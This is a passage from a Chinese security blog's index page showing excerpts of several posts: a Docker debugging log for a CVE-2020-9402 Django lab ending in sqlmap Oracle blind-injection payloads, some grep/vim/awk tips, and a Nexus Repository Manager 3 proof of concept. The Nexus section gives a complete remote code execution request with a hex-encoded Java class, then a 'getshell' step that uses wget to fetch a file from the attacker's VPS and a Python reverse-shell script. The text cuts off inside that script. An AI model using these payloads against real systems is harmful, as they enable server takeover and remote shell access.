<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bin4xin@bin4xin<span class="s1">'s MacbookPro CVE-2020-9402 % sudo docker exec -it a66976bc6d2b /bin/bash
root@a66976bc6d2b:/usr/src# 
root@a66976bc6d2b:/usr/src# ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 06:44 ?        00:00:00 /bin/bash /docker-entrypoint.sh python manage.py runserver 0.0.0.0:8000
root         7     1  0 06:44 ?        00:00:00 bash /usr/local/bin/wait-for-it.sh -t 0 db:1521 -- echo oracle is up
root        56     0  0 06:45 pts/0    00:00:00 /bin/bash
root        73     7  0 06:45 ?        00:00:00 sleep 1
root        74    56  0 06:45 pts/0    00:00:00 ps -ef
</span></code></pre></div></div>
<p>看了一下，没什么大问题啊，服务该照常启动的都启动了，难道是db服务的问题？就在我疑惑的时候，果然：容器又重启了，我的shell直接掉了，查看一下状态，可不咋地，又restart了，心里苦阿。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bin4xin@bin4xin<span class="s1">'s MacbookPro CVE-2020-9402 % docker ps

CONTAINER ID        IMAGE                  COMMAND                  CREATED             STATUS                         PORTS                          NAMES
a66976bc6d2b        cve-2020-9402_web      "/docker-entrypoint.…"   2 minutes ago       Restarting (1) 2 seconds ago
</span></code></pre></div></div>

<h2 id="日志排错-">#日志排错:-)</h2>
<p>排错之前看一下docker的打印日志指南</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>% docker logs <span class="nt">--help</span>

Usage:  docker logs <span class="o">[</span>OPTIONS] CONTAINER

Fetch the logs of a container

Options:
      <span class="nt">--details</span>        Show extra details provided to logs
  <span class="nt">-f</span>, <span class="nt">--follow</span>         Follow log output
      <span class="nt">--since</span> string   Show logs since timestamp <span class="o">(</span>e.g. 2013-01-02T13:23:37<span class="o">)</span> or relative <span class="o">(</span>e.g. 42m <span class="k">for </span>42 minutes<span class="o">)</span>
      <span class="nt">--tail</span> string    Number of lines to show from the end of the logs <span class="o">(</span>default <span class="s2">"all"</span><span class="o">)</span>
  <span class="nt">-t</span>, <span class="nt">--timestamps</span>     Show timestamps
      <span class="nt">--until</span> string   Show logs before a timestamp <span class="o">(</span>e.g. 2013-01-02T13:23:37<span class="o">)</span> or relative <span class="o">(</span>e.g. 42m <span class="k">for </span>42 minutes<span class="o">)</span>
</code></pre></div></div>
<p>我们可以看到，f参数对应的是log查看的容器id，而我的需求是，对应查看某一个时间段之后的db虚拟机的日志，所以生成命令：<code class="language-plaintext highlighter-rouge">docker logs --since 2020-09-11T14:50:00  -f b5731d06d3ea</code>
web的日志:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bin4xin@bin4xin<span class="s1">'s MacbookPro shiro % docker logs --since 2020-09-11T14:40:00  -f ae715c332e7e
+ cd /usr/src
+ wait-for-it.sh -t 0 db:1521 -- echo '</span>oracle is up<span class="s1">'
wait-for-it.sh: waiting for db:1521 without a timeout
wait-for-it.sh: db:1521 is available after 60 seconds
oracle is up
</span></code></pre></div></div>
<p>我们可以看到没有任何报错；继续，看下面的报错：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+ python manage.py makemigrations
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"/usr/local/lib/python3.6/site-packages/django/db/backends/base/base.py"</span>, line 220, <span class="k">in </span>ensure_connection
    self.connect<span class="o">()</span>
  File <span class="s2">"/usr/local/lib/python3.6/site-packages/django/utils/asyncio.py"</span>, line 26, <span class="k">in </span>inner
    <span class="k">return </span>func<span class="o">(</span><span class="k">*</span>args, <span class="k">**</span>kwargs<span class="o">)</span>
  File <span class="s2">"/usr/local/lib/python3.6/site-packages/django/db/backends/base/base.py"</span>, line 197, <span class="k">in </span>connect
    self.connection <span class="o">=</span> self.get_new_connection<span class="o">(</span>conn_params<span class="o">)</span>
  File <span class="s2">"/usr/local/lib/python3.6/site-packages/django/utils/asyncio.py"</span>, line 26, <span class="k">in </span>inner
    <span class="k">return </span>func<span class="o">(</span><span class="k">*</span>args, <span class="k">**</span>kwargs<span class="o">)</span>
  File <span class="s2">"/usr/local/lib/python3.6/site-packages/django/db/backends/oracle/base.py"</span>, line 232, <span class="k">in </span>get_new_connection
    <span class="k">**</span>conn_params,
cx_Oracle.DatabaseError: ORA-12505: TNS:listener does not currently know of SID given <span class="k">in </span>connect descriptor


The above exception was the direct cause of the following exception:

Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"manage.py"</span>, line 21, <span class="k">in</span> &lt;module&gt;
    main<span class="o">()</span>
·中间部分省略
·中间部分省略
·中间部分省略
    <span class="k">**</span>conn_params,
django.db.utils.DatabaseError: ORA-12505: TNS:listener does not currently know of SID given <span class="k">in </span>connect descriptor
</code></pre></div></div>
<p>查看报错是db的报错，赶紧看看db虚拟机的日志情况<code class="language-plaintext highlighter-rouge">docker logs --since 2020-09-11T14:40:00  -f b32b16e34b6c</code>
db：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span>: cannot access /u01/app/oracle/oradata/orcl: No such file or directory
No databases found <span class="k">in</span> /u01/app/oracle/oradata/orcl. About to create a new database instance
Starting database listener

LSNRCTL <span class="k">for </span>Linux: Version 12.1.0.2.0 - Production on 11-SEP-2020 06:54:05

Copyright <span class="o">(</span>c<span class="o">)</span> 1991, 2014, Oracle.  All rights reserved.

Starting /u01/app/oracle/product/12.1.0.2/dbhome_1/bin/tnslsnr: please wait...

TNSLSNR <span class="k">for </span>Linux: Version 12.1.0.2.0 - Production
System parameter file is /u01/app/oracle/product/12.1.0.2/dbhome_1/network/admin/listener.ora
Log messages written to /u01/app/oracle/diag/tnslsnr/b32b16e34b6c/listener/alert/log.xml
Listening on: <span class="o">(</span><span class="nv">DESCRIPTION</span><span class="o">=(</span><span class="nv">ADDRESS</span><span class="o">=(</span><span class="nv">PROTOCOL</span><span class="o">=</span>tcp<span class="o">)(</span><span class="nv">HOST</span><span class="o">=</span>b32b16e34b6c<span class="o">)(</span><span class="nv">PORT</span><span class="o">=</span>1521<span class="o">)))</span>

Connecting to <span class="o">(</span><span class="nv">DESCRIPTION</span><span class="o">=(</span><span class="nv">ADDRESS</span><span class="o">=(</span><span class="nv">PROTOCOL</span><span class="o">=</span>TCP<span class="o">)(</span><span class="nv">HOST</span><span class="o">=</span>b32b16e34b6c<span class="o">)(</span><span class="nv">PORT</span><span class="o">=</span>1521<span class="o">)))</span>
STATUS of the LISTENER
<span class="nt">------------------------</span>
Alias                     LISTENER
Version                   TNSLSNR <span class="k">for </span>Linux: Version 12.1.0.2.0 - Production
Start Date                11-SEP-2020 06:54:05
Uptime                    0 days 0 hr. 0 min. 0 sec
Trace Level               off
Security                  ON: Local OS Authentication
SNMP                      OFF
Listener Parameter File   /u01/app/oracle/product/12.1.0.2/dbhome_1/network/admin/listener.ora
Listener Log File         /u01/app/oracle/diag/tnslsnr/b32b16e34b6c/listener/alert/log.xml
Listening Endpoints Summary...
  <span class="o">(</span><span class="nv">DESCRIPTION</span><span class="o">=(</span><span class="nv">ADDRESS</span><span class="o">=(</span><span class="nv">PROTOCOL</span><span class="o">=</span>tcp<span class="o">)(</span><span class="nv">HOST</span><span class="o">=</span>b32b16e34b6c<span class="o">)(</span><span class="nv">PORT</span><span class="o">=</span>1521<span class="o">)))</span>
The listener supports no services
The <span class="nb">command </span>completed successfully
Copying database files
1% <span class="nb">complete
</span>3% <span class="nb">complete
</span>11% <span class="nb">complete
</span>18% <span class="nb">complete</span>
</code></pre></div></div>
<p>数据库服务似乎已经启动起来了，但是数据库文件还在复制过程中：<code class="language-plaintext highlighter-rouge">Copying database files</code>，那就等待文件复制完成试试看是不是复制文件的行为。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>100% <span class="nb">complete
</span>Look at the log file <span class="s2">"/u01/app/oracle/cfgtoollogs/dbca/orcl/orcl.log"</span> <span class="k">for </span>further details.

LSNRCTL <span class="k">for </span>Linux: Version 12.1.0.2.0 - Production on 11-SEP-2020 07:00:33

Copyright <span class="o">(</span>c<span class="o">)</span> 1991, 2014, Oracle.  All rights reserved.

Connecting to <span class="o">(</span><span class="nv">DESCRIPTION</span><span class="o">=(</span><span class="nv">ADDRESS</span><span class="o">=(</span><span class="nv">PROTOCOL</span><span class="o">=</span>TCP<span class="o">)(</span><span class="nv">HOST</span><span class="o">=</span>b32b16e34b6c<span class="o">)(</span><span class="nv">PORT</span><span class="o">=</span>1521<span class="o">)))</span>
The <span class="nb">command </span>completed successfully
Database has been created <span class="k">in</span> /u01/app/oracle/oradata/orcl
SYS and SYSTEM passwords are <span class="nb">set </span>to <span class="o">[</span>oracle]
Setting HTTP port to 8080

PL/SQL procedure successfully completed.

Please login to http://&lt;ip_address&gt;:8080/em to use enterprise manager
User: sys<span class="p">;</span> Password oracle<span class="p">;</span> Sysdba: <span class="nb">true
</span>Fixing permissions...
Running init scripts...
Init scripts <span class="k">in</span> /oracle.init.d/: Ignoring /oracle.init.d/<span class="k">*</span>

Done with scripts we are ready to go
</code></pre></div></div>
<p>难道是因为db的原因导致web服务报错，而且恰好报错是oracle数据库的错，而又恰好我们看日志时是存在这样的情况的。返回去在看web虚拟机的日志，果然：db虚拟机数据库文件拷贝完成后，这边web虚拟机重启后启动服务就没有报错了，服务跑在8000端口。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+ <span class="nb">cd</span> /usr/src
+ wait-for-it.sh <span class="nt">-t</span> 0 db:1521 <span class="nt">--</span> <span class="nb">echo</span> <span class="s1">'oracle is up'</span>
wait-for-it.sh: waiting <span class="k">for </span>db:1521 without a <span class="nb">timeout
</span>wait-for-it.sh: db:1521 is available after 0 seconds
oracle is up
+ python manage.py makemigrations
Migrations <span class="k">for</span> <span class="s1">'vuln'</span>:
  vuln/migrations/0001_initial.py
    - Create model Names
    - Create model Collection
    - Create model Collection2
+ python manage.py migrate
Operations to perform:
  Apply all migrations: admin, auth, contenttypes, sessions, vuln
Running migrations:
  Applying contenttypes.0001_initial... OK
  Applying auth.0001_initial... OK
  Applying admin.0001_initial... OK
  Applying admin.0002_logentry_remove_auto_add... OK
  Applying admin.0003_logentry_add_action_flag_choices... OK
  Applying contenttypes.0002_remove_content_type_name... OK
  Applying auth.0002_alter_permission_name_max_length... OK
  Applying auth.0003_alter_user_email_max_length... OK
  Applying auth.0004_alter_user_username_opts... OK
  Applying auth.0005_alter_user_last_login_null... OK
  Applying auth.0006_require_contenttypes_0002... OK
  Applying auth.0007_alter_validators_add_error_messages... OK
  Applying auth.0008_alter_user_username_max_length... OK
  Applying auth.0009_alter_user_last_name_max_length... OK
  Applying auth.0010_alter_group_name_max_length... OK
  Applying auth.0011_update_proxy_permissions... OK
  Applying sessions.0001_initial... OK
  Applying vuln.0001_initial... OK
+ python manage.py loaddata collection.json
Installed 8 object<span class="o">(</span>s<span class="o">)</span> from 1 fixture<span class="o">(</span>s<span class="o">)</span>
+ python manage.py shell <span class="nt">-c</span> <span class="s1">'from django.contrib.auth.models import User; User.objects.create_superuser('</span><span class="se">\'</span><span class="s1">'admin'</span><span class="se">\'</span><span class="s1">', '</span><span class="se">\'</span><span class="s1">'admin@vulhub.org'</span><span class="se">\'</span><span class="s1">', '</span><span class="se">\'</span><span class="s1">'admin'</span><span class="se">\'</span><span class="s1">') if not User.objects.filter(username='</span><span class="se">\'</span><span class="s1">'admin'</span><span class="se">\'</span><span class="s1">').exists() else 0'</span>
+ <span class="nb">exec </span>python manage.py runserver 0.0.0.0:8000
</code></pre></div></div>
<h2 id="令人失望的结果">#令人失望的结果</h2>
<p><code class="language-plaintext highlighter-rouge">exec python manage.py runserver 0.0.0.0:8000</code>看到这个日志打印出来，觉得好像确实没有什么问题了，再来查看一下docker的状态。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bin4xin@bin4xin<span class="s1">'s MacbookPro CVE-2020-9402 % docker-compose ps
       Name                      Command               State              Ports            
-------------------------------------------------------------------------------------------
cve-2020-9402_db_1    /entrypoint.sh                   Up      1521/tcp, 5500/tcp, 8080/tcp
cve-2020-9402_web_1   /docker-entrypoint.sh pyth ...   Up      0.0.0.0:8000-&gt;8000/tcp    
</span></code></pre></div></div>
<p>看一眼docker的情况，都是up状态。访问一下8000端口终于也可以访问到web服务了，不再是<code class="language-plaintext highlighter-rouge">Empty reply from server</code>了。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bin4xin@bin4xin<span class="s1">'s MacbookPro CVE-2020-9402 % curl localhost:8000
&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
  &lt;meta http-equiv="content-type" content="text/html; charset=utf-8"&gt;
  &lt;title&gt;Page not found at /&lt;/title&gt;
  &lt;meta name="robots" content="NONE,NOARCHIVE"&gt;
  &lt;style type="text/css"&gt;
    html * { padding:0; margin:0; }
    body * { padding:10px 20px; }
    body * * { padding:0; }
    body { font:small sans-serif; background:#eee; color:#000; }
    body&gt;div { border-bottom:1px solid #ddd; }
    h1 { font-weight:normal; margin-bottom:.4em; }
    h1 span { font-size:60%; color:#666; font-weight:normal; }
    table { border:none; border-collapse: collapse; width:100%; }
    td, th { vertical-align:top; padding:2px 3px; }
    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
    #info { background:#f6f6f6; }
    #info ol { margin: 0.5em 4em; }
    #info ol li { font-family: monospace; }
    #summary { background: #ffc; }
    #explanation { background:#eee; border-bottom: 0px none; }
  &lt;/style&gt;
</span></code></pre></div></div>
<p>web访问日志：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Watching <span class="k">for </span>file changes with StatReloader
Not Found: /
<span class="o">[</span>11/Sep/2020 07:01:23] <span class="s2">"GET / HTTP/1.1"</span> 404 2137

Not Found: /
<span class="o">[</span>11/Sep/2020 07:06:47] <span class="s2">"GET / HTTP/1.1"</span> 404 2141
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">---</span>
Parameter: q <span class="o">(</span>GET<span class="o">)</span>
    Type: boolean-based blind
    Title: Oracle boolean-based blind - Parameter replace
    Payload: <span class="nv">q</span><span class="o">=(</span>SELECT <span class="o">(</span>CASE WHEN <span class="o">(</span><span class="nv">6457</span><span class="o">=</span>6457<span class="o">)</span> THEN 6457 ELSE CAST<span class="o">(</span>1 AS INT<span class="o">)</span>/<span class="o">(</span>SELECT 0 FROM DUAL<span class="o">)</span> END<span class="o">)</span> FROM DUAL<span class="o">)</span>

    Type: time-based blind
    Title: Oracle time-based blind - Parameter replace <span class="o">(</span>DBMS_PIPE.RECEIVE_MESSAGE<span class="o">)</span>
    Payload: <span class="nv">q</span><span class="o">=(</span>SELECT <span class="o">(</span>CASE WHEN <span class="o">(</span><span class="nv">6135</span><span class="o">=</span>6135<span class="o">)</span> THEN DBMS_PIPE.RECEIVE_MESSAGE<span class="o">(</span>CHR<span class="o">(</span>83<span class="o">)||</span>CHR<span class="o">(</span>74<span class="o">)||</span>CHR<span class="o">(</span>88<span class="o">)||</span>CHR<span class="o">(</span>115<span class="o">)</span>,5<span class="o">)</span> ELSE 6135 END<span class="o">)</span> FROM DUAL<span class="o">)</span>
<span class="nt">---</span>
<span class="o">[</span>15:22:11] <span class="o">[</span>INFO] the back-end DBMS is Oracle
back-end DBMS: Oracle
</code></pre></div></div>

          <p><a href="/blog/2020/docker/vuln/problems/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/use/vim/in/linux/"><h3 class="ctitle">「技巧」：linux&unix Terminal小技巧</h3></a>
          <p><csmall>Sep 1, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h1 id="grep">grep</h1>

<ul>
  <li>grep -n “get_spg2lsf” -r ./</li>
</ul>

<p>在当前文件夹下查找包含”get_spg2lsf”字符串的文件</p>

<h1 id="vim">vim</h1>

<h3 id="快速删除">快速删除</h3>
<p>1、删除每行前10个字符：</p>

<ul>
  <li>:%s/^.{10}//</li>
</ul>

<p>其中，%表示所有行，s表示替换，”%s”可用”1,$”代替（下同）；</p>

<p>正则表达式”/^.{10}//”中，^表示行首；”.”表示要删除的字符个数，”.{10}“表示删除10个字符，可用10个”.”表示；</p>

<p>2、删除每行后10个字符</p>

<ul>
  <li>:%s/.{10}$//</li>
</ul>

<h3 id="字符串替换">字符串替换</h3>
<p>vi/vim 中可以使用 :s 命令来替换字符串。</p>

<p>　　:s/vivian/sky/ 替换当前行第一个 vivian 为 sky</p>

<p>　　:s/vivian/sky/g 替换当前行所有 vivian 为 sky</p>

<p>　　:n,$s/vivian/sky/ 替换第 n 行开始到最后一行中每一行的第一个 vivian 为 sky</p>

<p>　　:n,$s/vivian/sky/g 替换第 n 行开始到最后一行中每一行所有 vivian 为 sky</p>

<h1 id="awk">awk</h1>
<p>在实际信息搜集过程中遇到的问题：</p>

<p><strong>现在有一个hosts文件，其中包含了所需要信息搜集的域名和ip地址，其格式如下存储：
domain.com.cn,1.1.1.1</strong></p>

<p>首先按照信息搜集的方式第一步我是先过一遍ip或域名的端口，所以问题就来了。
nmap不支持这种形式进行文件内容读取，需以一行一数据的形式，就是：</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">domain</span><span class="p">.</span><span class="nx">com</span><span class="p">.</span><span class="nx">cn1</span>
<span class="nx">ip1</span>
<span class="nx">domain</span><span class="p">.</span><span class="nx">com</span><span class="p">.</span><span class="nx">cn2</span>
<span class="nx">ip2</span>
</code></pre></div></div>
<p>不管是域名还是ip地址都是以这样的形式来读取才能使用<code class="language-plaintext highlighter-rouge">-iL</code>参数来读取指定的域名或ip，最后实现我们的端口扫描任务，所以是需要以逗号为界限，将两列数据分成两个文件；</p>

<p>故我们构思一下思路：以逗号为标示，把前面一列和后面一列分别使用参数$1，$2来表示，将$1输出到domain1.txt，$2输出到domain2.txt中。</p>


          <p><a href="/blog/2020/use/vim/in/linux/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/Nexus/vuln-Cve/"><h3 class="ctitle">「Src」：Nexus-Repository-Manager3-漏洞复现总结</h3></a>
          <p><csmall>Aug 23, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <p>只是简单记录一下关于这个管理软件的poc代码；</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /service/extdirect HTTP/1.1
Host: vuln_ip
sUser-Agent: Mozilla/5.0 <span class="o">(</span>Macintosh<span class="p">;</span> Intel Mac OS X 10.15<span class="p">;</span> rv:79.0<span class="o">)</span> Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/webp,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
Accept-Language: zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,zh-TW<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7,zh-HK<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5,en-US<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.3,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.2
Accept-Encoding: <span class="nb">gzip</span>, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
Content-Length: 7249

<span class="o">{</span><span class="s2">"action"</span>: <span class="s2">"coreui_Component"</span>, <span class="s2">"type"</span>: <span class="s2">"rpc"</span>, <span class="s2">"tid"</span>: 8, <span class="s2">"data"</span>: <span class="o">[{</span><span class="s2">"sort"</span>: <span class="o">[{</span><span class="s2">"direction"</span>: <span class="s2">"ASC"</span>, <span class="s2">"property"</span>: <span class="s2">"name"</span><span class="o">}]</span>, <span class="s2">"start"</span>: 0, <span class="s2">"filter"</span>: <span class="o">[{</span><span class="s2">"property"</span>: <span class="s2">"repositoryName"</span>, <span class="s2">"value"</span>: <span class="s2">"*"</span><span class="o">}</span>, <span class="o">{</span><span class="s2">"property"</span>: <span class="s2">"expression"</span>, <span class="s2">"value"</span>: <span class="s2">"function(x, y, z, c, integer, defineClass){   c=1.class.forName('java.lang.Character');   integer=1.class;   x='CAFEBABE0000003100AE0A001F00560A005700580A005700590A005A005B0A005A005C0A005D005E0A005D005F0700600A000800610A006200630700640800650A001D00660800410A001D00670A006800690A0068006A08006B08004508006C08006D0A006E006F0A006E00700A001F00710A001D00720800730A000800740800750700760A001D00770700780A0079007A08007B08007C07007D0A0023007E0A0023007F0700800100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100114C4578706C6F69742F546573743233343B01000474657374010015284C6A6176612F6C616E672F537472696E673B29560100036F626A0100124C6A6176612F6C616E672F4F626A6563743B0100016901000149010003636D640100124C6A6176612F6C616E672F537472696E673B01000770726F636573730100134C6A6176612F6C616E672F50726F636573733B01000269730100154C6A6176612F696F2F496E70757453747265616D3B010006726573756C740100025B42010009726573756C745374720100067468726561640100124C6A6176612F6C616E672F5468726561643B0100056669656C640100194C6A6176612F6C616E672F7265666C6563742F4669656C643B01000C7468726561644C6F63616C7301000E7468726561644C6F63616C4D61700100114C6A6176612F6C616E672F436C6173733B01000A7461626C654669656C640100057461626C65010005656E74727901000A76616C75654669656C6401000E68747470436F6E6E656374696F6E01000E48747470436F6E6E656374696F6E0100076368616E6E656C01000B487474704368616E6E656C010008726573706F6E7365010008526573706F6E73650100067772697465720100154C6A6176612F696F2F5072696E745772697465723B0100164C6F63616C5661726961626C65547970655461626C650100144C6A6176612F6C616E672F436C6173733C2A3E3B01000A457863657074696F6E7307008101000A536F7572636546696C6501000C546573743233342E6A6176610C002700280700820C008300840C008500860700870C008800890C008A008B07008C0C008D00890C008E008F0100106A6176612F6C616E672F537472696E670C002700900700910C009200930100116A6176612F6C616E672F496E74656765720100106A6176612E6C616E672E5468726561640C009400950C009600970700980C0099009A0C009B009C0100246A6176612E6C616E672E5468726561644C6F63616C245468726561644C6F63616C4D617001002A6A6176612E6C616E672E5468726561644C6F63616C245468726561644C6F63616C4D617024456E74727901000576616C756507009D0C009E009F0C009B00A00C00A100A20C00A300A40100276F72672E65636C697073652E6A657474792E7365727665722E48747470436F6E6E656374696F6E0C00A500A601000E676574487474704368616E6E656C01000F6A6176612F6C616E672F436C6173730C00A700A80100106A6176612F6C616E672F4F626A6563740700A90C00AA00AB01000B676574526573706F6E73650100096765745772697465720100136A6176612F696F2F5072696E745772697465720C00AC002F0C00AD002801000F4578706C6F69742F546573743233340100136A6176612F6C616E672F457863657074696F6E0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000777616974466F7201000328294901000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B0100136A6176612F696F2F496E70757453747265616D010009617661696C61626C6501000472656164010007285B4249492949010005285B4229560100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010007666F724E616D65010025284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F436C6173733B0100106765744465636C617265644669656C6401002D284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F7265666C6563742F4669656C643B0100176A6176612F6C616E672F7265666C6563742F4669656C6401000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100176A6176612F6C616E672F7265666C6563742F41727261790100096765744C656E677468010015284C6A6176612F6C616E672F4F626A6563743B2949010027284C6A6176612F6C616E672F4F626A6563743B49294C6A6176612F6C616E672F4F626A6563743B010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B0100076765744E616D6501001428294C6A6176612F6C616E672F537472696E673B010006657175616C73010015284C6A6176612F6C616E672F4F626A6563743B295A0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100057772697465010005636C6F736500210026001F000000000002000100270028000100290000002F00010001000000052AB70001B100000002002A00000006000100000009002B0000000C000100000005002C002D00000009002E002F0002002900000304000400140000013EB800022AB600034C2BB60004572BB600054D2CB60006BC084E2C2D032CB60006B6000757BB0008592DB700093A04B8000A3A05120B57120CB8000D120EB6000F3A06190604B6001019061905B600113A07120B571212B8000D3A0819081213B6000F3A09190904B6001019091907B600113A0A120B571214B8000D3A0B190B1215B6000F3A0C190C04B60010013A0D03360E150E190AB80016A2003E190A150EB800173A0F190FC70006A70027190C190FB600113A0D190DC70006A70016190DB60018B60019121AB6001B990006A70009840E01A7FFBE190DB600183A0E190E121C03BD001DB6001E190D03BD001FB600203A0F190FB600183A101910122103BD001DB6001E190F03BD001FB600203A111911B600183A121912122203BD001DB6001E191103BD001FB60020C000233A1319131904B600241913B60025B100000003002A0000009600250000001600080017000D0018001200190019001A0024001B002E001D0033001F004200200048002100510023005B002500640026006A002700730029007D002A0086002B008C002D008F002F009C003100A5003200AA003300AD003500B6003600BB003700BE003900CE003A00D1002F00D7003D00DE003E00F4003F00FB004001110041011800420131004401380045013D0049002B000000DE001600A5002C00300031000F0092004500320033000E0000013E003400350000000801360036003700010012012C00380039000200190125003A003B0003002E0110003C003500040033010B003D003E0005004200FC003F00400006005100ED004100310007005B00E3004200430008006400DA004400400009007300CB00450031000A007D00C100460043000B008600B800470040000C008F00AF00480031000D00DE006000490043000E00F4004A004A0031000F00FB0043004B004300100111002D004C0031001101180026004D004300120131000D004E004F00130050000000340005005B00E3004200510008007D00C100460051000B00DE006000490051000E00FB0043004B0051001001180026004D005100120052000000040001005300010054000000020055';   y=0;   z='';   while (y lt x.length()){       z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0];       y += 2;   };defineClass=2.class.forName('java.lang.Thread');x=defineClass.getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader').invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.class,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentType()); </span><span class="se">\n</span><span class="s2">defineClass.setAccessible(true);</span><span class="se">\n</span><span class="s2">x=defineClass.invoke(</span><span class="se">\n</span><span class="s2">    y,</span><span class="se">\n</span><span class="s2">   'Exploit.Test234',</span><span class="se">\n</span><span class="s2">    z.getBytes('latin1'),    0,</span><span class="se">\n</span><span class="s2">    3054</span><span class="se">\n</span><span class="s2">);x.getMethod('test', ''.class).invoke(null, 'ifconfig');'done!'}</span><span class="se">\n</span><span class="s2">"</span><span class="o">}</span>, <span class="o">{</span><span class="s2">"property"</span>: <span class="s2">"type"</span>, <span class="s2">"value"</span>: <span class="s2">"jexl"</span><span class="o">}]</span>, <span class="s2">"limit"</span>: 50, <span class="s2">"page"</span>: 1<span class="o">}]</span>, <span class="s2">"method"</span>: <span class="s2">"previewAssets"</span><span class="o">}</span>
</code></pre></div></div>
<p>getshell:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">下载反弹文件</span>
<span class="nx">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="dl">'</span><span class="s1">wget http://vps_to_your_py:8000/nc.py</span><span class="dl">'</span><span class="p">);</span>
<span class="o">---</span>
<span class="nx">cat</span> <span class="nx">nc</span><span class="p">.</span><span class="nx">py</span>

<span class="k">import</span> <span class="nx">socket</span><span class="p">,</span><span class="nx">subprocess</span><span class="p">,</span><span class="nx">os</span><span class="p">;</span>
<span class="nx">s</span><span class="o">=</span><span class="nx">socket</span><span class="p">.</span><span class="nx">socket</span><span class="p">(</span><span class="nx">socket</span><span class="p">.</span><span class="nx">AF_INET</span><span class="p">,</span><span class="nx">socket</span><span class="p">.</span><span class="nx">SOCK_STREAM</span><span class="p">);</span><span class="nx">s</span><span class="p">.</span><span class="nx">connect</span><span class="p">((</span><span class="dl">"</span><span class="s2">vps_ip</span><span class="dl">"</span><span class="p">,</span><span class="nx">port</span><span class="p">));</span><span class="nx">os</span><span class="p">.</span><span class="nx">dup2</span><span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span> <span class="nx">os</span><span class="p">.</span><span class="nx">dup2</span><span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span> <span class="nx">os</span><span class="p">.</span><span class="nx">dup2</span><span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="nx">p</span><span class="o">=</span><span class="nx">subprocess</span><span class="p">.</span><span class="nx">call</span><span class="p">([</span><span class="dl">"</span><span class="s2">/bin/sh</span><span 